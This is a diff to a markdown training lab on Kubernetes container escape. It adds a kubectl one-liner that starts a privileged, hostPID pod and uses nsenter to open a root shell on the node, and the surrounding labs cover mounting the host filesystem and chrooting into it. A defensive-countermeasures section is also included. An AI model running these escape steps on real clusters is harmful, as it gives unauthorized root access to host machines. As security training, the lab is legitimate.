@@ -1,12 +1,14 @@
 # 🧪 Container Escape in Kubernetes (for Educational Purposes Only)
 
 ## ⚠️ Disclaimer
+
 **This lab is for training and awareness only!**  
 Never attempt container escapes in unauthorized environments.
 
 ---
 
 ## 🎯 Objective
+
 Understand how misconfigured containers can allow attackers to escape into the host system.
 
 ---
@@ -19,7 +21,40 @@ Understand how misconfigured containers can allow attackers to escape into the h
 
 ---
 
-## 🔹 Lab 1: Deploy a Privileged Pod
+## Lab 1: One-Liner Kubernetes Container Escape
+
+Duffie Cooley and Ian Coldwater pulled the following Kubernetes one-liner together the first time they met:
+
+### Step 1: Run the one-liner
+
+Just run this:
+
+```bash
+kubectl run r00t --restart=Never \
+  -ti --rm --image lol \
+  --overrides '{"spec":{"hostPID": true, \
+  "containers":[{"name":"1","image":"alpine",\
+  "command":["nsenter","--mount=/proc/1/ns/mnt","--",\
+  "/bin/bash"],"stdin": true,"tty":true,\
+  "securityContext":{"privileged":true}}]}}'
+```
+
+### Step 2: Check for root in the process namespace
+
+```bash
+r00t# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),...
+```
+
+### Step 3: Check for kernel PIDs to verify we’re in the root namespace
+
+```bash
+r00t# ps faux 
+```
+
+---
+
+## 🔹 Lab 2: Deploy a Privileged Pod
 
 Deploy a highly privileged pod:
 
@@ -47,7 +82,7 @@ kubectl apply -f privileged-escape-pod.yaml
 
 ---
 
-## 🔹 Lab 2: Inspect Host Processes from Inside the Pod
+## 🔹 Lab 3: Inspect Host Processes from Inside the Pod
 
 ```bash
 kubectl exec -it escape-demo -- sh
@@ -63,7 +98,7 @@ ps aux
 
 ---
 
-## 🔹 Lab 3: Access the Host Filesystem
+## 🔹 Lab 4: Access the Host Filesystem
 
 Still inside the container:
 
@@ -85,7 +120,7 @@ ls /mnt
 
 ---
 
-## 🔹 Lab 4: Spawn a Host Shell
+## 🔹 Lab 5: Spawn a Host Shell
 
 Inside the container (dangerous):
 
@@ -97,7 +132,7 @@ chroot /mnt /bin/sh
 
 ---
 
-## 🔹 Lab 5: Defensive Countermeasures
+## 🔹 Lab 6: Defensive Countermeasures
 
 - **Never** allow `privileged: true` unless absolutely necessary.
 - **Do not** enable `hostPID`, `hostNetwork`, or `hostIPC` unless required.
@@ -107,7 +142,7 @@ chroot /mnt /bin/sh
 
 ---
 
-## 🔹 Lab 6: Clean Up
+## 🔹 Lab 7: Clean Up
 
 ```bash
 kubectl delete pod escape-demo
